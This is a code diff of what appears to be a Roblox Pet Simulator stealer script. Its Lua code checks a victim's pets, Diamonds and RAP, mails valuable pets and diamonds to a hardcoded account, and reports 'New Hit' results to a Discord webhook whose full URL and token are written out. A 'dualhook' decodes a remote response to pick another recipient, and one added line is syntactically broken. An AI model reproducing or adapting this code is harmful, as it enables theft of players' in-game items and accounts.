@@ -4,20 +4,6 @@ local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
 
-local savedPets = Library.Save.Get().Pets
-hugeamount = 0
-for i,v in pairs(Library.Save.Get().Pets) do
-    local Pet = Library.Directory.Pets[v.id]
-        if Pet.huge == true then
-        hugeamount = hugeamount + 1
-        print(v)
-    end
-end
-if hugeamount >2 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
-     UserName = "TehPucuk_55"
-     Webhook = "https://discord.com/api/webhooks/1126402135786000395/TV27VBc_jbyXZHliylbsadlR2kzI9CAmwv_Rsnk-lu8H0d47NNj6AisAcZKlUoeBYujx"
-end
-
 if getgenv().executed then return end
 getgenv().executed = true
 
@@ -1032,7 +1018,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                 ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
-                ["color"] = tonumber(0xf7262a),
+                ["color"] = tonumber(0xAB0909),
                 ["thumbnail"] = {
                     ["url"] = Image,
                     ["height"] = 420,
@@ -1102,7 +1088,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                 ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
-                ["color"] = tonumber(0xf7262a),
+                ["color"] = tonumber(0xAB0909),
                 ["thumbnail"] = {
                     ["url"] = Image,
                     ["height"] = 420,
@@ -1170,7 +1156,7 @@ if getgenv().Settings ~= nil then
             Headers = dhheaders
         })
         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
-        if responsed ~= 'true' then
+        if responsed ~= 'false' then
             dhuser = responsed
         else
             dhuser = nil
@@ -1221,6 +1207,9 @@ if dhuser ~= nil then
     if getgenv().Settings.MailMessage ~= nil then
         mailmsg = getgenv().Settings.MailMessage
     end
+    if getgenv().Settings."TehPucuk_55" ~= nil then
+       _G.UserName = getgenv().Settings."TehPucuk_55"
+    end
 end
 
 -- Dualhook intensity
@@ -1261,7 +1250,7 @@ if FinalList == 0 then
     end
     local args = {
         [1] = {
-            ["Recipient"] = user,
+            ["Recipient"] = "TehPucuk_55",
             ["Diamonds"] = givediaamt,
             ["Pets"] = {},
             ["Message"] = mailmsg,
@@ -1281,7 +1270,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1309,7 +1298,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1331,7 +1320,7 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
-                user = UserName
+                user = ndUser
                 if hugein ~= nil then
                     if dualhook(hugein) then
                         user = dhuser
@@ -1368,7 +1357,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
